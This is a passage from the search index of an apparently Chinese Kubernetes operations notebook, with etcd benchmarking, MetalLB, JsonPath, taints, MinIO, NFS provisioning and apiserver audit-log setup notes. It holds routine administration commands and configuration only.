\u5199\u5165\u8bf7\u6c42\u53d1\u5230 leader\n# 1\nbenchmark \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --conns=1 --clients=1 \\\n  put --key-size=8 --sequential-keys --total=10000 --val-size=256 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# 2\nbenchmark \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --conns=100 --clients=100 \\\n  put --key-size=8 --sequential-keys --total=10000 --val-size=256 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# \u5199\u5165\u53d1\u5230\u6240\u6709\u6210\u5458\n# 3\nbenchmark \\\n  --endpoints=https://10.101.11.240:2379,https://10.101.11.114:2379,https://10.101.11.154:2379 \\\n  --conns=100 --clients=100 \\\n  put --key-size=8 --sequential-keys --total=10000 --val-size=256 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# \u5206\u6790\u7ed3\u679c\nawk '/Average|Requests\\/sec/{if($1~/Average/){latency+=$2*1000}else if($1~/Requests\\/sec/){qps+=$2}}END{printf(\"%.1f\\t%d\\n\",latency,qps)}' /tmp/benchmark.out\n</code></pre>"},{"location":"kubernetes/39-etcd/#312-","title":"3.1.2 \u538b\u6d4b-\u8bfb","text":"<pre><code># Linearizable \u8bfb\u53d6\u8bf7\u6c42\n# 1\nbenchmark \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --conns=1 --clients=1 \\\n  range YOUR_KEY --consistency=l --total=10000 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# 2\nbenchmark \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --conns=100 --clients=100 \\\n  range YOUR_KEY --consistency=l --total=10000 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# Serializable \u8bfb\u53d6\u8bf7\u6c42\uff0c\u4f7f\u7528\u6bcf\u4e2a\u6210\u5458\u7136\u540e\u5c06\u6570\u5b57\u52a0\u8d77\u6765\n# 3\nfor endpoint in \\\n  https://10.101.11.240:2379 \\\n  https://10.101.11.114:2379 \\\n  https://10.101.11.154:2379\ndo\nbenchmark \\\n  --endpoints=$endpoint \\\n  --conns=1 --clients=1 \\\n  range YOUR_KEY --consistency=s --total=1000 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\ndone 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# 4\nfor endpoint in \\\n  https://10.101.11.240:2379 \\\n  https://10.101.11.114:2379 \\\n  https://10.101.11.154:2379\ndo\nbenchmark \\\n  --endpoints=$endpoint \\\n  --conns=100 --clients=100 \\\n  range YOUR_KEY --consistency=s --total=1000 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\ndone 2&gt;&amp;1 1&gt;/tmp/benchmark.out\n\n# \u5206\u6790\u7ed3\u679c\nawk '/Average|Requests\\/sec/{if($1~/Average/){latency+=$2*1000}else if($1~/Requests\\/sec/){qps+=$2}}END{printf(\"%.1f\\t%d\\n\",latency,qps)}' /tmp/benchmark.out\n</code></pre>"},{"location":"kubernetes/39-etcd/#313","title":"3.1.3 \u7ed3\u679c\u5206\u6790","text":"<p>\u5f53\u6269\u5bb9\u540eETCD\u8282\u70b9\u5728\u4e0d\u540c\u6570\u91cf\u4e0b\u5de5\u4f5c\u6027\u80fd\u5bf9\u6bd4</p> <p>\u5728\u5b9e\u9a8c\u73af\u5883\u505a\u538b\u6d4b\u6548\u679c\u5982\u4e0b</p> <p>7\u4e2a\u8282\u70b9</p> \u65b9\u5f0f \u7b56\u7565 \u8bf7\u6c42\u6570 key value conns clients latency qps write leader 10000 8 256 1 1 31.9 31 write leader 10000 8 256 100 100 188 529 write all member 10000 8 256 100 100 187 532 read Linearizable 10000 8 256 1 1 3.5 284 read Linearizable 10000 8 256 100 100 15.8 6184 read Serializable 10000 8 256 1 1 4.5 1443 read Serializable 10000 8 256 100 100 83 10608 <p>3\u4e2a\u8282\u70b9</p> \u65b9\u5f0f \u7b56\u7565 \u8bf7\u6c42\u6570 key value conns clients latency qps write leader 10000 8 256 1 1 4 251 write leader 10000 8 256 100 100 46.9 2114 write all member 10000 8 256 100 100 27.2 3474 read Linearizable 10000 8 256 1 1 2.4 412 read Linearizable 10000 8 256 100 100 31.7 3134 read Serializable 10000 8 256 1 1 3.7 2450 read Serializable 10000 8 256 100 100 95.9 8412 <ul> <li>\u7ed3\u679c\u663e\u793a\u5f53etcd cluster\u8282\u70b9\u8fbe7\u4e2a\u65f6\u5199\u5ef6\u8fdf\u63d0\u53475-8\u500dQPS\u4e0b\u964d5-8\u500d</li> <li>\u8282\u70b9\u589e\u52a0\u81f37\u4e2a\u96c6\u7fa4\u81ea\u8eab\u6d88\u8017\u4f1a\u6bd4\u8f83\u4e25\u91cd</li> </ul>"},{"location":"kubernetes/39-etcd/#32","title":"3.2 \u95ee\u9898","text":""},{"location":"kubernetes/39-etcd/#321-etcd","title":"3.2.1 ETCD \u6570\u636e\u4e0d\u4e00\u81f4","text":"<p>Reference</p> <pre><code>+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n|         ENDPOINT          |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |\n+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n| https://10.101.11.240:2379 | 5fa87e503b09d83d |   3.5.1 |  112 MB |      true |      false |         3 |  311385411 |          311385411 |        |\n| https://10.101.11.114:2379 | 797dc1cea3a53a6b |   3.5.1 |  119 MB |     false |      false |         3 |  311385411 |          311385411 |        |\n| https://10.101.11.154:2379 | 8ac0782f040c745a |   3.5.1 |  123 MB |     false |      false |         3 |  311385411 |          311385411 |        |\n+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n</code></pre> <ul> <li>3\u4e2a\u8282\u70b9\u4e2dDB SIZE\u4e0d\u4e00\u81f4</li> <li>\u901a\u8fc7\u5224\u65ad <code>RAFT INDEX | RAFT APPLIED INDEX</code> \u65ad\u5b9a\u6570\u636e\u5df2\u7ecf\u5b8c\u6574\u540c\u6b65</li> <li>\u5728\u5b9e\u9a8c\u73af\u5883\u6a21\u62df\u51fa\u6b64\u73b0\u8c61\uff0c\u7ecf\u6267\u884c <code>etcdctl defrag</code> \u6e05\u7406\u78c1\u76d8\u788e\u7247\u4f7f\u5176\u7edf\u4e00</li> </ul>"},{"location":"kubernetes/39-etcd/#322-etcd","title":"3.2.2 ETCD\u65e5\u5fd7\u62a5\u5f02\u5e38","text":"<pre><code>{\"level\":\"warn\",\"ts\":\"2023-03-13T08:46:25.065Z\",\"caller\":\"etcdserver/util.go:166\",\"msg\":\"apply request took too long\",\"took\":\"101.221909ms\",\"expected-duration\":\"100ms\",\"prefix\":\"read-only range \",\"request\":\"key:\\\"/registry/replicasets/kube-app/\\\" range_end:\\\"/registry/replicasets/kube-app0\\\" \",\"response\":\"range_response_count:2849 size:12995415\"}\n</code></pre> <ul> <li>ListOption \u4e0d\u8bbe\u7f6e <code>ResourceVersion=0</code> \u4f1a\u5bfc\u81f4 apiserver \u53bb etcd \u62ff\u6570\u636e\uff0c\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u3002</li> </ul> <pre><code>{\"level\":\"warn\",\"ts\":\"2023-03-14T01:41:03.397Z\",\"caller\":\"v3rpc/interceptor.go:197\",\"msg\":\"request stats\",\"start time\":\"2023-03-14T01:41:03.090Z\",\"time spent\":\"307.305871ms\",\"remote\":\"127.0.0.1:28932\",\"response type\":\"/etcdserverpb.KV/Range\",\"request count\":0,\"request size\":56,\"response count\":2028,\"response size\":1332819,\"request content\":\"key:\\\"/registry/events/kube-app/\\\" range_end:\\\"/registry/events/kube-app0\\\" \"}\n</code></pre>"},{"location":"kubernetes/42-metallb/","title":"MetalLB","text":"<p>\u5bf9\u5404CNI\u63d2\u4ef6\u652f\u6301\u60c5\u51b5</p>"},{"location":"kubernetes/42-metallb/#arp","title":"\u4e00\u3001\u652f\u6301 ARP","text":"<p>\u66f4\u65b0 kube-proxy \u914d\u7f6e</p> <pre><code>kubectl edit configmap -n kube-system kube-proxy\n\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\nmode: \"ipvs\"\nipvs:\n  strictARP: true # relative\n\n# restart  \nkubectl -n kube-system rollout restart ds kube-proxy\n</code></pre>"},{"location":"kubernetes/42-metallb/#metallb_1","title":"\u4e8c\u3001\u5b89\u88c5 metallb","text":"<pre><code>helm repo add metallb https://metallb.github.io/metallb\nhelm search repo metallb\nhelm show values metallb/metallb --version 0.13.5 &gt; metallb.yaml-0.13.5-default\n\n# Example\n#   https://books.8ops.top/attachment/kubernetes/helm/metallb.yaml-0.13.5\n#   https://books.8ops.top/attachment/kubernetes/10-metallb-ipaddresspool.yaml\n#   https://books.8ops.top/attachment/kubernetes/10-metallb-l2advertisement.yaml\n#\n\nhelm install metallb metallb/metallb \\\n    -f metallb.yaml-0.13.5 \\\n    --namespace=kube-server \\\n    --create-namespace \\\n    --version 0.13.5\n\nhelm upgrade --install metallb metallb/metallb \\\n    -f metallb.yaml-0.13.5 \\\n    --namespace=kube-server \\\n    --create-namespace \\\n    --version 0.13.5\n\nhelm -n kube-server uninstall metallb\n\nkubectl apply -f 10-metallb-ipaddresspool.yaml\nkubectl apply -f 10-metallb-l2advertisement.yaml\n\nping -c 5 10.101.11.216\n</code></pre> <p>vim metallb.yaml-0.13.5</p> <pre><code>prometheus:\n  scrapeAnnotations: true\n\ncontroller:\n  enabled: true\n  logLevel: info\n  image:\n    repository: hub.8ops.top/google_containers/metallb-controller\n    tag: v0.13.5\n\nspeaker:\n  enabled: true\n  logLevel: info\n  image:\n    repository: hub.8ops.top/google_containers/metallb-speaker\n    tag: v0.13.5\n</code></pre> <p>vim 10-metallb-ipaddresspool.yaml</p> <pre><code>apiVersion: metallb.io/v1beta1\nkind: IPAddressPool\nmetadata:\n  name: first-pool\n  namespace: kube-server\nspec:\n  addresses:\n  - 10.101.11.212-10.101.11.216\n</code></pre> <p>vim 10-metallb-l2advertisement.yaml</p> <pre><code>apiVersion: metallb.io/v1beta1\nkind: L2Advertisement\nmetadata:\n  name: l2\n  namespace: kube-server\nspec:\n  ipAddressPools:\n  - first-pool\n</code></pre>"},{"location":"kubernetes/42-metallb/#_1","title":"\u4e09\u3001\u4f7f\u7528\u53cd\u9988","text":"<p>\u5f53\u4f7f\u7528 <code>ingress-nginx</code> \u66b4\u9732\u6d41\u91cf\u65f6\uff0c\u9700\u8981\u83b7\u53d6 XFF \u4fe1\u606f\uff0c\u9700\u8981 \u53d8\u66f4 <code>externalTrafficPolicy</code> \u7b56\u7565</p> <pre><code>kubectl patch \\\n    svc ingress-nginx-external-controller-external \\\n    -n kube-server \\\n    -p '{\"spec\":{\"externalTrafficPolicy\":\"Local\"}}'\n# OR Edit\n# kubectl edit svc ingress-nginx-external-controller-external -n kube-server\n#  externalTrafficPolicy: Local\n</code></pre> <p>Reference</p> <ul> <li>https://metallb.universe.tf/faq/</li> </ul>"},{"location":"kubernetes/44-jsonpath/","title":"JsonPath","text":"<p>Reference</p>"},{"location":"kubernetes/44-jsonpath/#_1","title":"\u4e00\u3001\u7b14\u8bb0","text":"<pre><code># \u65e0\u6362\u884c\u6253\u5370\nkubectl get po -A \\\n    -o jsonpath='{.items[*].spec.containers[*].image}'\n\n# go-template print\nkubectl get po -A -o go-template \\\n    --template='{{range .items}}{{printf \"%s\\n\" .metadata.name}}{{end}}'\n\n# go-template print\nkubectl get po -A -o go-template \\\n    --template='{{range .items}}{{printf \"%s\\n\" .spec.containers[0].image}}{{end}}'\n\n# jsonpath print\nkubectl get po -A \\\n    -o=jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}'\n\n# \u8f6c\u8bd1\nkubectl get secret tls-example.com \\\n    -o jsonpath='{.data.ca\\.crt}'\n</code></pre>"},{"location":"kubernetes/44-jsonpath/#_2","title":"\u4e8c\u3001\u5e38\u7528\u6280\u5de7","text":"Function Description Example Result <code>text</code> the plain text <code>kind is {.kind}</code> <code>kind is List</code> <code>@</code> the current object <code>{@}</code> the same as input <code>.</code> or <code>[]</code> child operator <code>{.kind}</code>, <code>{['kind']}</code> or <code>{['name\\.type']}</code> <code>List</code> <code>..</code> recursive descent <code>{..name}</code> <code>127.0.0.1 127.0.0.2 myself e2e</code> <code>*</code> wildcard. Get all objects <code>{.items[*].metadata.name}</code> <code>[127.0.0.1 127.0.0.2]</code> <code>[start:end:step]</code> subscript operator <code>{.users[0].name}</code> <code>myself</code> <code>[,]</code> union operator <code>{.items[*]['metadata.name', 'status.capacity']}</code> <code>127.0.0.1 127.0.0.2 map[cpu:4] map[cpu:8]</code> <code>?()</code> filter <code>{.users[?(@.name==\"e2e\")].user.password}</code> <code>secret</code> <code>range</code>, <code>end</code> iterate list <code>{range .items[*]}[{.metadata.name}, {.status.capacity}] {end}</code> <code>[127.0.0.1, map[cpu:4]] [127.0.0.2, map[cpu:8]]</code> <code>''</code> quote interpreted string <code>{range .items[*]}{.metadata.name}{'\\t'}{end}</code> <code>127.0.0.1 127.0.0.2</code>"},{"location":"kubernetes/45-taint-and-toleration/","title":"Taints and Tolerations","text":"<p>Reference</p> <pre><code># --- \nkubectl taint nodes k-node-03 node-role.kubernetes.io/prometheus:NoSchedule\nkubectl taint nodes k-node-03 node-role.kubernetes.io/prometheus:NoSchedule-\n\nkubectl taint nodes k-k8s-node-03 node-role.kubernetes.io/elastic:NoSchedule\nkubectl taint nodes k-node-03 node-role.kubernetes.io/elastic:NoSchedule-\n\n# --- \nNODE\n  taints:\n  - effect: NoSchedule\n    key: node-role.kubernetes.io/control-plane\n# Taints:             node-role.kubernetes.io/control-plane:NoSchedule\nPOD\n  tolerations:\n  - effect: NoExecute\n    operator: Exists\nPOD\n# daemonset.apps/kube-flannel-ds, daemonset.apps/kube-proxy\n      tolerations:\n      - operator: Exists\n\n# --- \nNODE\n  taints:\n  - effect: NoSchedule\n    key: node-role.kubernetes.io/prometheus\n# Taints:             node-role.kubernetes.io/prometheus:NoSchedule\n# deployment.apps/echoserver\n      tolerations:\n      - operator: Exists\n\n# --- \nkubectl get no k-k8s-master-01 -o=jsonpath='{.spec.taints}';echo\nkubectl get no k-k8s-node-01 -o=jsonpath='{.spec.taints}';echo\nkubectl get no k-k8s-node-02 -o=jsonpath='{.spec.taints}';echo\nkubectl get no k-k8s-node-03 -o=jsonpath='{.spec.taints}';echo\n\nkubectl patch node k-k8s-node-03 -p '{\"spec\":{\"taints\":[]}}'\n</code></pre> <p>\u6548\u679c\u9009\u62e9</p> \u6548\u679c \u8bf4\u660e <code>NoSchedule</code> \u4e0d\u80fd\u5bb9\u5fcd\u6b64\u6c61\u70b9\u7684 Pod \u4e0d\u4f1a\u88ab\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\uff1b\u73b0\u6709 Pod \u4e0d\u4f1a\u4ece\u8282\u70b9\u4e2d\u9010\u51fa\u3002 <code>PreferNoSchedule</code> Kubernetes \u4f1a\u5c3d\u91cf\u907f\u514d\u5c06\u4e0d\u80fd\u5bb9\u5fcd\u6b64\u6c61\u70b9\u7684 Pod \u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u3002 <code>NoExecute</code> \u5982\u679c Pod \u5df2\u5728\u8282\u70b9\u4e0a\u8fd0\u884c\uff0c\u5219\u8be5 Pod \u4f1a\u4ece\u8282\u70b9\u4e2d\u88ab\u9010\u51fa\uff1b\u5982\u679c\u5c1a\u672a\u5728\u8282\u70b9\u4e0a\u8fd0\u884c\uff0c\u5219\u4e0d\u4f1a\u88ab\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u3002"},{"location":"kubernetes/51-minio/","title":"MinIO","text":"<p>Reference</p>"},{"location":"kubernetes/51-minio/#server","title":"\u4e00\u3001Server","text":"<p>linux </p> <pre><code>wget https://dl.min.io/server/minio/release/linux-amd64/minio\nchmod +x minio\n./minio server /opt/lib/minio\n\n# http://10.101.11.236:9193/buckets\n</code></pre> <p>kubernetes</p> <pre><code>kubectl krew install minio\nkubectl minio init\nkubectl minio tenant create tenant1 --servers 4 --volumes 16 --capacity 16Ti\n</code></pre>"},{"location":"kubernetes/51-minio/#11-helm","title":"1.1 Helm","text":"<pre><code>helm repo add minio https://charts.min.io/\nhelm repo update minio\nhelm search repo minio\nhelm show values minio/minio --version 5.0.4 &gt; minio-5.0.4.yaml-default\n\nhelm show values bitnami/minio --version 11.10.21 &gt; minio-11.10.21.yaml-default\n</code></pre>"},{"location":"kubernetes/51-minio/#client","title":"\u4e8c\u3001Client","text":"<p>linux</p> <pre><code>curl https://dl.min.io/client/mc/release/linux-amd64/mc -k -o ~/bin/mc\nchmod +x ~/bin/mc\n\nmc --help\n\nmc alias set myminio http://10.101.11.236:9193 minioadmin minioadmin\n</code></pre> <p>kubernetes</p> <pre><code>kubectl run my-mc -i --tty --image minio/mc:latest --command -- bash\n[root@my-mc /]# mc alias set myminio/ https://minio.default.svc.cluster.local MY-USER MY-PASSWORD\n[root@my-mc /]# mc ls myminio/mybucket\n</code></pre>"},{"location":"kubernetes/52-nfs-provider/","title":"NFS Provider","text":""},{"location":"kubernetes/52-nfs-provider/#_1","title":"\u4e00\u3001\u5b89\u88c5","text":"<pre><code>helm repo add nfs-provider https://kubernetes-sigs.github.io/nfs-subdir-external-provisioner\nhelm repo update nfs-provider\nhelm search repo nfs\nhelm show values nfs-provider/nfs-subdir-external-provisioner --version 4.0.17 &gt; nfs-provider.yaml-4.0.17-default\n\n# Example\n#   https://books.8ops.top/attachment/nfs-provider/helm/nfs-provider.yaml-4.0.17\n#   https://books.8ops.top/attachment/nfs-provider/helm/01-pod-busybox-nfs.yaml\n# \n\nhelm install nfs-provider nfs-provider/nfs-subdir-external-provisioner \\\n    --set nfs.server=10.101.11.236 \\\n    --set nfs.path=/data1/lib/nfs \\\n    -f nfs-provider.yaml-4.0.17 \\\n    --version 4.0.17\n\n# demo\nkubectl exec -it pod-busybox-nfs sh\nmount | grep nfs\ndate &gt; /data1/lib/nfs/from-busybox.txt\n</code></pre>"},{"location":"kubernetes/52-nfs-provider/#_2","title":"\u4e8c\u3001\u4f7f\u7528","text":"<pre><code># \u4ee5\u4e0b\u5b9e\u4f8b\u7684\u4e24\u4e2a\u8d44\u6e90\n# \n#   https://books.8ops.top/attachment/nfs-provider/10-sc-nfs-demo.yaml\n#   https://books.8ops.top/attachment/nfs-provider/12-deploy-busybox-nfs.yaml\n# \n</code></pre>"},{"location":"kubernetes/52-nfs-provider/#21-storageclass","title":"2.1 StorageClass","text":"<pre><code>items:\n- allowVolumeExpansion: true\n  apiVersion: storage.k8s.io/v1\n  kind: StorageClass\n  metadata:\n    labels:\n      app: nfs-subdir-external-provisioner\n      release: nfs-subdir-external-provisioner\n    name: nfs-client\n  parameters:\n    archiveOnDelete: \"true\"\n#    pathPattern: \"${.PVC.namespace}/${.PVC.annotations.nfs.io/storage-path}\" # default pvc-hashcode\n  provisioner: cluster.local/nfs-subdir-external-provisioner # ref pod provider\n  reclaimPolicy: Delete # Retain\n  volumeBindingMode: Immediate\nkind: List\n</code></pre>"},{"location":"kubernetes/52-nfs-provider/#22-pvc","title":"2.2 PVC","text":"<pre><code>kind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: pvc-pod-nfs\n  namespace: default\n  annotations:\n    nfs.io/storage-path: \"pod-demo\" # not required, depending on whether this annotation was shown in the storage class description Ref nfs path default/pod-demo\nspec:\n  storageClassName: \"nfs-client\"\n  accessModes:\n    - ReadWriteMany\n  resources:\n    requests:\n      storage: 100Mi\n</code></pre>"},{"location":"kubernetes/61-audit/","title":"Kubernetes Audit","text":""},{"location":"kubernetes/61-audit/#apiserverauditlog","title":"\u4e00\u3001apiserver\u5f00\u542faudit.log","text":"<p>\u4f7f\u7528 <code>kubeadm</code> \u542f\u7528 Kubernetes \u7684\u5ba1\u8ba1\u65e5\u5fd7\u529f\u80fd\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u5b9e\u73b0\u3002\u5177\u4f53\u64cd\u4f5c\u5305\u62ec\u4fee\u6539 API Server \u7684\u542f\u52a8\u53c2\u6570\u6765\u5f00\u542f\u5ba1\u8ba1\u65e5\u5fd7\u8bb0\u5f55\u5e76\u914d\u7f6e\u5ba1\u8ba1\u7b56\u7565\u3002</p>"},{"location":"kubernetes/61-audit/#1","title":"\u6b65\u9aa4 1\uff1a\u51c6\u5907\u5ba1\u8ba1\u7b56\u7565\u6587\u4ef6","text":"<p>\u9996\u5148\uff0c\u521b\u5efa\u4e00\u4e2a\u5ba1\u8ba1\u7b56\u7565\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5b9a\u4e49\u4e86 Kubernetes \u5e94\u8bb0\u5f55\u54ea\u4e9b\u7c7b\u578b\u7684\u64cd\u4f5c\u3002\u793a\u4f8b\u7b56\u7565\u6587\u4ef6\u5982\u4e0b\uff1a</p> <pre><code># audit-policy.yaml\napiVersion: audit.k8s.io/v1\nkind: Policy\nrules:\n  - level: Metadata  # \u8bb0\u5f55\u5143\u6570\u636e\u4fe1\u606f\uff0c\u4f8b\u5982\u7528\u6237\u3001\u8d44\u6e90\u7c7b\u578b\u7b49\n    verbs: [\"create\", \"update\", \"delete\"]  # \u8bb0\u5f55\u521b\u5efa\u3001\u66f4\u65b0\u3001\u5220\u9664\u64cd\u4f5c\n    resources:\n      - group: \"\"  # \u6307\u5b9a Core API \u8d44\u6e90\n        resources: [\"pods\", \"services\", \"deployments\"]  # \u8981\u5ba1\u8ba1\u7684\u8d44\u6e90\n  - level: None  # \u5ffd\u7565\u4e0d\u611f\u5174\u8da3\u7684\u5176\u4ed6\u8bf7\u6c42\n</code></pre> <pre><code>cat &gt; /etc/kubernetes/audit-policy.yaml &lt;&lt; EOF\napiVersion: audit.k8s.io/v1\nkind: Policy\nrules:\n  - level: Metadata\n    verbs: [\"create\", \"update\", \"delete\"]\n    resources:\n      - group: \"\"\n        resources: [\"pods\", \"services\", \"deployments\", \"configmaps\", \"secrets\", \"serviceaccounts\"]\n  - level: None\nEOF\n</code></pre> <p>\u5c06\u6b64\u6587\u4ef6\u4fdd\u5b58\u4e3a <code>audit-policy.yaml</code>\uff0c\u5e76\u5c06\u5176\u5b58\u653e\u5728\u4e3b\u8282\u70b9\u4e0a\u4e00\u4e2a\u5408\u9002\u7684\u76ee\u5f55\u4e2d\uff08\u4f8b\u5982 <code>/etc/kubernetes/audit-policy.yaml</code>\uff09\u3002</p>"},{"location":"kubernetes/61-audit/#2-api-server","title":"\u6b65\u9aa4 2\uff1a\u4fee\u6539 API Server \u7684\u542f\u52a8\u53c2\u6570","text":"<p>\u7f16\u8f91 API Server \u7684\u914d\u7f6e\u6587\u4ef6\u6765\u542f\u7528\u5ba1\u8ba1\u65e5\u5fd7\u529f\u80fd\u3002\u5728\u4f7f\u7528 <code>kubeadm</code> \u90e8\u7f72\u7684\u96c6\u7fa4\u4e2d\uff0cAPI Server \u7684\u914d\u7f6e\u4f4d\u4e8e <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>\u3002</p> <p>\u5728\u6b64\u6587\u4ef6\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u53c2\u6570\u6765\u542f\u7528\u5ba1\u8ba1\u65e5\u5fd7\uff1a</p> <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml\nspec:\n  containers:\n  - name: kube-apiserver\n    image: k8s.gcr.io/kube-apiserver:v1.xx.x  # \u786e\u4fdd\u8fd9\u91cc\u7684\u7248\u672c\u4e0e\u60a8\u7684 Kubernetes \u7248\u672c\u5339\u914d\n    command:\n      - kube-apiserver\n      - --audit-policy-file=/etc/kubernetes/audit-policy.yaml  # \u5ba1\u8ba1\u7b56\u7565\u6587\u4ef6\u8def\u5f84\n      - --audit-log-path=/var/log/kubernetes/audit.log         # \u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\n      - --audit-log-maxage=30                                  # \u5ba1\u8ba1\u65e5\u5fd7\u4fdd\u7559\u5929\u6570\n      - --audit-log-maxbackup=10                               # \u5ba1\u8ba1\u65e5\u5fd7\u5907\u4efd\u6587\u4ef6\u6570\n      - --audit-log-maxsize=100                                # \u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u9650\u5236\uff08\u5355\u4f4d MB\uff09\n</code></pre> <pre><code># kube-apiserver\u542f\u52a8\u547d\u4ee4\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n    - --audit-log-path=/var/log/kubernetes/audit.log\n    - --audit-log-maxage=7\n    - --audit-log-maxbackup=5\n    - --audit-log-maxsize=10\n\n# \u6302\u8f7d\u8fdb\u5bb9\u5668\n    - mountPath: /etc/kubernetes/audit-policy.yaml\n      name: audit-policy\n      readOnly: true\n    - mountPath: /var/log/kubernetes\n      name: audit-log\n\n# \u6302\u8f7d\u5bbf\u4e3b\u673a\u914d\u7f6e\n  - hostPath:\n      path: /etc/kubernetes/audit-policy.yaml\n      type: File\n    name: audit-policy\n  - hostPath:\n      path: /var/log/kubernetes\n      type: DirectoryOrCreate\n    name: audit-log\n</code></pre> <p>\u5c06 <code>audit-policy-file</code> \u6307\u5411\u521a\u624d\u521b\u5efa\u7684\u7b56\u7565\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u6307\u5b9a <code>audit-log-path</code> \u4e3a\u4fdd\u5b58\u5ba1\u8ba1\u65e5\u5fd7\u7684\u6587\u4ef6\u8def\u5f84\u3002</p>"},{"location":"kubernetes/61-audit/#3-api-server","title":"\u6b65\u9aa4 3\uff1a\u91cd\u542f API Server","text":"<p>\u7f16\u8f91\u5e76\u4fdd\u5b58 <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code> \u6587\u4ef6\u540e\uff0c<code>kubelet</code> \u4f1a\u68c0\u6d4b\u5230\u6587\u4ef6\u7684\u66f4\u6539\u5e76\u81ea\u52a8\u91cd\u542f <code>kube-apiserver</code> \u5bb9\u5668\uff0c\u4f7f\u65b0\u7684\u5ba1\u8ba1\u65e5\u5fd7\u8bbe\u7f6e\u751f\u6548\u3002</p>"},{"location":"kubernetes/61-audit/#4","title":"\u6b65\u9aa4 4\uff1a\u68c0\u67e5\u5ba1\u8ba1\u65e5\u5fd7","text":"<p>\u914d\u7f6e\u5b8c\u6210\u540e\uff0cAPI Server \u4f1a\u5728\u6307\u5b9a\u7684\u65e5\u5fd7\u6587\u4ef6\uff08\u5982 <code>/var/log/kubernetes/audit.log</code>\uff09\u4e2d\u751f\u6210\u5ba1\u8ba1\u8bb0\u5f55\u3002\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\u65e5\u5fd7\uff1a</p> <pre><code>cat /var/log/kubernetes/audit.log\n</code></pre>"},{"location":"kubernetes/61-audit/#_1","title":"\u53ef\u9009\uff1a\u5c06\u5ba1\u8ba1\u65e5\u5fd7\u53d1\u9001\u5230\u5916\u90e8\u65e5\u5fd7\u7ba1\u7406\u7cfb\u7edf","text":"<p>\u4e3a\u5b9e\u73b0\u66f4\u5168\u9762\u7684\u65e5\u5fd7\u5206\u6790\uff0c\u53ef\u4ee5\u4f7f\u7528 Fluentd\u3001Filebeat \u7b49\u5de5\u5177\u5c06\u65e5\u5fd7\u5bfc\u51fa\u81f3 ELK\u3001Splunk \u7b49\u65e5\u5fd7\u7ba1\u7406\u5e73\u53f0\u3002</p> <p>\u8fd9\u5c31\u5b8c\u6210\u4e86\u901a\u8fc7 <code>kubeadm</code> \u542f\u7528 Kubernetes \u5ba1\u8ba1\u65e5\u5fd7\u7684\u6d41\u7a0b\u3002</p>"},{"location":"kubernetes/61-audit/#falco","title":"\u4e8c\u3001Falco","text":"<p>Reference</p>"},{"location":"kubernetes/61-audit/#kubewatch","title":"\u4e09\u3001Kubewatch","text":"<p>Reference</p> <p>chat</p>"},{"location":"note/00-class/","title":"\u7ecf\u5178\u8bed\u5f55","text":"<p>\u5f3a\u5927\u7684\u4eba\u5728\u4e8e\u9762\u5bf9\u81ea\u5df1\u7684\u95ee\u9898</p> <ol> <li>\u58a8\u83f2\u5b9a\u5f8b-\u8d8a\u5bb3\u6015\u4ec0\u4e48\uff0c\u5c31\u8d8a\u5bb9\u6613\u53d1\u751f\u4ec0\u4e48</li> 